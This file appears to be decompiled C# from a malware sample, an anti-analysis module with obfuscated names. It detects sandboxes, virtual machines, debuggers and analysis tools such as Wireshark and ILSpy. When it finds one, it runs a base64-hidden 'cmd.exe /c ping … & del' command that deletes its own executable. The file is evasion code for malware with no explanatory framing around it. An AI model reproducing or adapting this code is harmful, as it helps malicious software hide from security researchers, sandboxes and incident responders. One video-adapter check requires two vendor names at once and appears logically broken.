using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns14;

namespace ns5;

public class GClass5
{
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string string_0);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			if (smethod_1() || smethod_5() || smethod_6() || smethod_4() || smethod_3() || smethod_7() || File.Exists(Environment.GetEnvironmentVariable("windir") + "\\vboxhook.dll") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("vmacthlp") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("vmtoolsd") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("VBoxTray") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("prl_cc") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("prl_tools") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("SharedIntApp") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("vmusrvc") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("vmsrvc") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("sample") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("SpyTheSpy") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("apateDNS") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("IPBlocker") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("TiGeR-Firewall") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("smsniff") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("NetSnifferCs") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("CodeReflect") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("Reflector") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("ILSpy") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("VGAuthService") || Process.GetCurrentProcess().MainModule!.FileName!.Contains("Wireshark"))
			{
				Interaction.Shell(Class0.smethod_4(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) + "\"" + Application.get_ExecutablePath() + "\"", (AppWinStyle)0, false, -1);
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static bool smethod_1()
	{
		bool result = default(bool);
		try
		{
			if (Process.GetProcessesByName("SbieSvc").Length >= 1)
			{
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool smethod_2()
	{
		string[] array = new string[5] { "SbieDll", "SxIn", "Sf2", "snxhk", "cmdvrt32" };
		string[] array2 = array;
		int num = 0;
		while (true)
		{
			if (num < array2.Length)
			{
				string text = array2[num];
				if (GetModuleHandle(text + ".dll").ToInt32() != 0)
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return false;
		}
		return true;
	}

	public static bool smethod_3()
	{
		Process[] processes = Process.GetProcesses();
		string[] source = new string[8] { "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain" };
		Process[] array = processes;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				Process process = array[num];
				if (source.Contains(process.ProcessName.ToLower()))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return false;
		}
		return true;
	}

	private static bool smethod_4()
	{
		bool result = default(bool);
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (DateTime.Now.Ticks - ticks < 10L)
			{
				result = true;
				return result;
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static bool smethod_5()
	{
		if (Process.GetProcessesByName("vmwareservice").Length >= 1)
		{
			return true;
		}
		return false;
	}

	public static bool smethod_6()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
				try
				{
					enumerator = val2.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						if ((object.Equals(current.get_Item("Manufacturer").ToString()!.ToLower(), "microsoft corporation") && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || current.get_Item("Manufacturer").ToString()!.ToLower().Contains("vmware") || object.Equals(current.get_Item("Model").ToString(), "VirtualBox"))
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		ManagementObjectEnumerator enumerator2 = default(ManagementObjectEnumerator);
		try
		{
			enumerator2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
			while (enumerator2.MoveNext())
			{
				ManagementBaseObject current2 = enumerator2.get_Current();
				if (current2.GetPropertyValue("Name").ToString()!.Contains("VMware") && current2.GetPropertyValue("Name").ToString()!.Contains("VBox"))
				{
					return true;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator2)?.Dispose();
		}
		return false;
	}

	public static bool smethod_7()
	{
		bool bool_ = false;
		try
		{
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref bool_);
			return bool_;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return bool_;
	}
}
